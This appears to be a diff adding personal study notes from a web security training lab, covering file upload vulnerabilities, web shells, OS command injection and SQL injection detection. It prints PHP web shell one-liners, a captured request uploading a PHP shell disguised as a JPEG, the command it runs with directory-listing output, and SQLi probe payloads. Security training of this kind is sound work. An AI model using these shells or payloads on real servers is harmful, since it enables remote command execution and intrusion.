@@ -61,6 +61,142 @@ Access control is the application of constraints on who or what is authorized to
         Content-Length: 118
         stockApi=http://192.168.0.68/admin
 
+-What are file upload vulnerabilities?
+  +
 
+-How do file upload vulnerabilities arise?
+
+-Exploiting unrestricted file uploads to deploy a web shell
+  **Web shell
+  A web shell is a malicious script that enables an attacker to execute arbitrary commands on a remote web server simply by sending HTTP requests to the right endpoint.
+  +For example, the following PHP one-liner could be used to read arbitrary files from the server's filesystem:
+  <?php echo file_get_contents('/path/to/target/file'); ?>
+   more versatile web shell may look something like this:
+  <?php echo system($_GET['command']); ?>
+  This script enables you to pass an arbitrary system command via a query parameter as follows:
+  GET /example/exploit.php?command=id HTTP/1.1
+
+  advanced:POST /my-account/avatar HTTP/2
+Host: 0a64006804f882d780ea85dc00f60063.web-security-academy.net
+Cookie: session=FiqQyJTKrmiLi1QWQmKBLjEQpOpYMwDW
+Content-Length: 439
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Origin: https://0a64006804f882d780ea85dc00f60063.web-security-academy.net
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOaByz6FHNtDmINK2
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://0a64006804f882d780ea85dc00f60063.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate, br
+Priority: u=0, i
+
+------WebKitFormBoundaryOaByz6FHNtDmINK2
+Content-Disposition: form-data; name="avatar"; filename="hi.php"
+Content-Type: image/jpeg
+
+<?php echo system($_GET['cmd']); ?>
+
+------WebKitFormBoundaryOaByz6FHNtDmINK2
+Content-Disposition: form-data; name="user"
+
+wiener
+------WebKitFormBoundaryOaByz6FHNtDmINK2
+Content-Disposition: form-data; name="csrf"
+
+LpErJUGioIPhtS2mO4Ui8nXNUSgAF8Hx
+------WebKitFormBoundaryOaByz6FHNtDmINK2--
+=======================================================================
+GET /files/avatars/hi.php?cmd=ls+-la+/home/carlos HTTP/2
+Host: 0a64006804f882d780ea85dc00f60063.web-security-academy.net
+Cookie: session=FiqQyJTKrmiLi1QWQmKBLjEQpOpYMwDW
+Sec-Ch-Ua-Platform: "Windows"
+Accept-Language: en-US,en;q=0.9
+Sec-Ch-Ua: "Chromium";v="139", "Not;A=Brand";v="99"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Sec-Ch-Ua-Mobile: ?0
+Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: no-cors
+Sec-Fetch-Dest: image
+Referer: https://0a64006804f882d780ea85dc00f60063.web-security-academy.net/my-account
+Accept-Encoding: gzip, deflate, br
+Priority: u=2, i
+
+HTTP/2 200 OK
+Date: Thu, 28 Aug 2025 05:19:45 GMT
+Server: Apache/2.4.41 (Ubuntu)
+Vary: Accept-Encoding
+Content-Type: text/html; charset=UTF-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 372
+
+total 16
+drwxr-xr-x 1 carlos carlos   20 Aug 28 04:27 .
+drwxr-xr-x 1 root   root     20 Jul  6 01:11 ..
+-rw-r--r-- 1 carlos carlos  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 carlos carlos 3771 Feb 25   2020 .bashrc
+-rw-r--r-- 1 carlos carlos  807 Feb 25  2020 .profile
+-rw-rw-r-- 1 carlos carlos   32 Aug 28 04:27 secret
+-rw-rw-r-- 1 carlos carlos   32 Aug 28 04:27 secret
+
+-Exploiting flawed validation of file uploads
+
+-Flawed file type validation
+  +POST request with the content type application/x-www-form-url-encoded
+  +An entire image file or a PDF document. In this case, the content type multipart/form-data is preferred.
+  +ex: POST /images HTTP/1.1
+    Host: normal-website.com
+    Content-Length: 12345
+    Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="image"; filename="example.jpg"
+    Content-Type: image/jpeg
+
+    [...binary content of example.jpg...]
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="description"
+
+    This is an interesting description of my image.
+
+    ---------------------------012345678901234567890123456
+    Content-Disposition: form-data; name="username"
+
+    wiener
+    ---------------------------012345678901234567890123456--
+
+-What is OS command injection?
+-Useful commands
++  
+  Purpose of command	    Linux      	        Windows
+Name of current user	    whoami	            whoami
+Operating system	        uname -a	            ver
+Network configuration   	ifconfig	          ipconfig /all
+  Network connections	    netstat -an        	netstat -an
+Running processes	        ps -ef	            tasklist
+
+-Injecting OS commands
+Placing the additional command separator & after the injected command is useful because it separates the injected command from whatever follows the injection point. This reduces the chance that what follows will prevent the injected command from executing.
+
+-What is SQL injection (SQLi)?
+-How to detect SQL injection vulnerabilities
+  **You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:
+  +The single quote character ' and look for errors or other anomalies.
+  +Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
+  +Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.
+  +Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
+  +OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.
+
+-Retrieving hidden data
+-Subverting application logic
 
 
